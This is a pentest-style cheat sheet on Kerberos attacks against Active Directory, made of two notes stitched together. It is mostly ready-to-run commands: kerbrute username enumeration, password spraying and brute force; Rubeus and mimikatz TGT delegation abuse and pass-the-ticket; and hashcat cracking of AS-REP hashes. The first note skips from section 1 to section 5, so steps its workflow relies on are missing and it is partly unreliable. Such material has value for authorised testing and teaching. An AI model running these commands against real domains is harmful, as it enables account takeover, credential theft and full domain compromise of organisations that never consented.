# Kerberos Enumeration

Kerberos enumeration is a key phase in Active Directory assessments used to identify users, service accounts, misconfigurations, and potential attack paths without requiring high privileges.

It focuses on interacting with the Kerberos protocol to gather useful information such as valid usernames, SPNs, and ticket-based data that can be leveraged for offline attacks or lateral movement.

---

# Prerequisites

- Network access to Domain Controller (TCP/UDP 88)
- Domain name (e.g., armour.local)
- Optional: valid domain credentials (for advanced enumeration)

---

# 1. User Enumeration via Kerberos

Identify valid domain users by observing Kerberos responses.

## Tools
- kerbrute

## Commands
    kerbrute userenum --dc 192.168.1.10 -d armour.local users.txt

## Key Points
- Does not require authentication
- Valid usernames return different responses than invalid ones
- Useful for building a target user list

👉 Look for high-privileged accounts with SPNs

# 5. TGT Enumeration and Extraction

Extract or request Ticket Granting Tickets.

## Tools
- Rubeus

## Commands
    Rubeus.exe tgtdeleg

## Key Points
- Abuses delegation mechanisms
- Can obtain usable tickets without full compromise
- Useful for lateral movement

---

# 6. Ticket Inspection

View and analyze Kerberos tickets on a system.

## Tools
- klist
- mimikatz

## Commands
    klist
    mimikatz # kerberos::list

## Key Points
- Displays active Kerberos tickets
- Helps identify current user context and access
- Useful before performing ticket attacks

---

# 7. Pass-the-Ticket (PTT)

Reuse Kerberos tickets for authentication.

## Tools
- Rubeus
- mimikatz

## Commands
    Rubeus.exe ptt /ticket:<base64_ticket>
    mimikatz # kerberos::ptt ticket.kirbi

## Key Points
- Does not require password or hash
- Requires valid ticket file or blob
- Enables lateral movement

---

# 8. Password Spraying via Kerberos

Test weak passwords across multiple users.

## Tools
- kerbrute

## Commands
    kerbrute passwordspray -d armour.local --dc 192.168.1.10 users.txt password123

## Key Points
- Uses Kerberos protocol (port 88)
- Less noisy than SMB/LDAP spraying
- Must respect lockout policies

---

# 9. Delegation Enumeration

Identify accounts configured for delegation.

## Tools
- PowerView
- BloodHound

## Commands
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth

## Key Points
- Identifies unconstrained and constrained delegation
- High-value targets for privilege escalation
- Often leads to full domain compromise

---

# 10. Kerberos Service Discovery

Identify services using Kerberos authentication.

## Techniques
- Port scanning (88, 464)
- SPN enumeration
- Service ticket requests

## Key Points
- Helps map attack surface
- Identifies Kerberos-enabled services

# Practical Enumeration Workflow

1. Enumerate valid users using Kerberos  
2. Perform AS-REP Roasting (no credentials required)  
3. Use valid credentials for Kerberoasting  
4. Enumerate SPNs and delegation settings  
5. Extract and inspect Kerberos tickets  
6. Perform ticket-based attacks (PTT, TGT reuse)  
7. Attempt password spraying carefully  

---

# Summary

Kerberos enumeration enables attackers and security testers to gather valuable information about users, services, and authentication mechanisms within an Active Directory environment.

By leveraging ticket-based interactions and protocol responses, it is possible to identify misconfigurations and weak credentials without direct system compromise.

# Kerberos Username Enumeration

Kerberos username enumeration is a technique used in Active Directory environments to identify valid user accounts without authentication.

By interacting with the Kerberos protocol (port 88), attackers can distinguish between valid and invalid usernames based on authentication responses.

This document covers two common methods:

- Nmap (krb5-enum-users NSE script)
- Kerbrute

---

# 1. Username Enumeration with Nmap

The krb5-enum-users NSE script sends Kerberos AS-REQ requests and analyzes responses to determine valid usernames.

## Basic Scan
    nmap -v -sT -sV --script=krb5-enum-users.nse -p 88 10.10.10.161

## Scan with Custom Username List
    nmap -v -sT -sV -p 88 \
    --script=krb5-enum-users \
    --script-args krb5-enum-users.realm='htb.local',userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    10.10.10.161

## Output Results in All Formats
    nmap -v -sT -sV -p 88 --script=krb5-enum-users \
    --script-args krb5-enum-users.realm='armourinfosec.local',userdb=/root/ad/username.txt \
    192.168.1.50 -oA krb-users

---

# Parsing Nmap Results

## Extract Valid Usernames
    grep @armourinfosec.local krb-users.nmap

## Extract Username Field (Column 6)
    grep @armourinfosec.local krb-users.nmap | cut -d " " -f 6 > krb-users-list.txt

## Append Additional Matches
    grep @armourinfosec.local krb-users.nmap | cut -d " " -f 5 | grep armour >> krb-users-list.txt

## Manual Cleanup
    vim krb-users-list.txt

# 2. Kerbrute

Kerbrute is a fast Kerberos enumeration and brute-force tool written in Go.

It supports:
- Username enumeration
- Password spraying
- Brute-force attacks

Repository:
https://github.com/ropnop/kerbrute

---

# Installation

    git clone https://github.com/ropnop/kerbrute.git
    cd kerbrute
    make all
    go install

## Verify Installation
    which kerbrute

## Move Binary (Optional)
    cp -v /root/go/bin/kerbrute /usr/local/bin/

## Help Menu
    kerbrute -h

---

# User Enumeration

## Basic Enumeration
    kerbrute userenum --dc 192.168.2.100 -d htb.local -o kerbrute.log usernames.txt

## Verbose Mode
    kerbrute userenum --dc 192.168.2.100 -d htb.local -o kerbrute.log usernames.txt -v

---

# Save AS-REP Hashes

    kerbrute userenum --dc 192.168.2.100 -d htb.local \
    -o kerbrute.log usernames.txt \
    --hash-file AS-REP-hash.txt

## View Hashes
    cat AS-REP-hash.txt

---

# Cracking AS-REP Hashes with Hashcat

## Identify Kerberos Hash Modes
    hashcat -h | grep Kerberos

## Crack Hashes
    hashcat -a 0 -m 18200 AS-REP-hash.txt /opt/rockyou.txt

---

# Password Spraying

## Example
    kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \
    -o kerbrute.log krb-users-list.txt armour123

## Alternate Password
    kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \
    -o kerbrute.log krb-users-list.txt 12344321

---

# Brute Force Attacks

## Single User
    kerbrute bruteuser --dc 192.168.2.100 -d infosecwarrior.local /opt/passwords.txt administrator

## Username + Password Combinations
    kerbrute bruteforce --dc 192.168.2.100 -d infosecwarrior.local \
    -o kerbrute.log /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt

## Example
    kerbrute bruteuser --dc 192.168.2.100 -d infosecwarrior.local /opt/password.txt bob

# Best Practices

- Use the Domain Controller IP to avoid DNS resolution issues  
- Monitor logs carefully for false positives or lockouts  
- Avoid aggressive spraying to prevent account lockouts  
- Combine results with tools like BloodHound for privilege escalation paths  
- Perform testing only in authorized environments
